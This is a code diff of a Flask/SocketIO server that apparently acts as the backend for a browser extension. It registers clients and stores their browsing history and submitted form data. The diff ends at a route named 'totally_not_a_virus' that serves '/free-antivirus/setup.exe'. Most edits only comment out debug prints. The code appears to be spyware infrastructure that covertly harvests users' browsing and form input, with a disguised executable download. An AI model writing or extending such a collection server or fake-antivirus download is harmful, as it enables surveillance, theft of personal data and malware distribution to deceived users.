@@ -21,7 +21,7 @@ http status code, data
 
 @socketio.on('connect', namespace='/socket.io')
 def handle_ext_connect():
-    print("client connected sid: {}".format(request.sid))
+    #print("client connected sid: {}".format(request.sid))
     return {'message':'connection successful'}
     send('connection successful', room=request.sid)
 """
@@ -38,15 +38,13 @@ client payload handler:
 @socketio.on('extpayload', namespace='/socket.io')
 def handle_ext_ping(data):
     print("client ping sid: {} data: {}".format(request.sid, data))
-    #form = [{"url":"www.google.com/", "unammmmeeeee":"becca"}]
-    #database.store_form_data(form, 108)
     clientid = data["clientid"]
     bad = 400, "Invalid payload"
     if validate_payload(data) == 0:
         print("Invalid payload received from client.: {}".format(data))
         return bad[1]
     elif data["clientid"] == 0: #new client connection!
-        print("Generating new client info")
+        #print("Generating new client info")
         clientid = database.create_new_client(data)
         connected_clients.append((clientid, request.sid))
         resp = database.construct_response(clientid)
@@ -59,7 +57,7 @@ def handle_ext_ping(data):
                 isConnected = 1
         if(isConnected == 0):
             connected_clients.append((clientid, request.sid))
-            print('client {} reconnected'.format(clientid))
+            #print('client {} reconnected'.format(clientid))
             emit('connectSuccessful', clientid, namespace="/socket.io", broadcast=True) 
         if len(data["history"]) > 0 and database.store_history(data["history"], clientid):
             return bad
@@ -77,7 +75,7 @@ def handle_ext_ping(data):
 
 def handle_form_id_mappings_submit(mappingsStr, url):
     mappings = json.loads(mappingsStr)
-    print("processing new form mappings")
+    #print("processing new form mappings")
     data = [{}]
     data[0].update({"url":url})
     for x in mappings:
@@ -98,7 +96,7 @@ def do_pong(clientid, payload):
 
 @socketio.on('disconnect')
 def handle_ext_disconnect():
-    print("client disconnected: {}".format(request.sid))
+    #print("client disconnected: {}".format(request.sid))
     clientids = [(clientid, sidx) for clientid, sidx in connected_clients if sidx == request.sid]
     if len(clientids) == 1:
         clientid = clientids[0]
@@ -106,7 +104,7 @@ def handle_ext_disconnect():
         database.store_payload(clientid)
         emit('disconnectSuccessful', clientid, namespace="/socket.io", broadcast=True)
     elif len(clientids) != 0:
-        print("what the fuck did you do, multiple clients disconnected from same sid: {}".format(clientids))
+        print("multiple clients disconnected from same sid: {}".format(clientids))
         connected_clients.remove(clientids)
 
 def validate_payload(data):
@@ -118,10 +116,6 @@ def validate_payload(data):
         return 0
     return 1
 
-""" @app.route('/submitform', methods=['POST'])
-def submit_form():
-    return redirect(request.form['formurl'])
- """
 
 @app.route('/free-antivirus/setup.exe')
 def totally_not_a_virus():
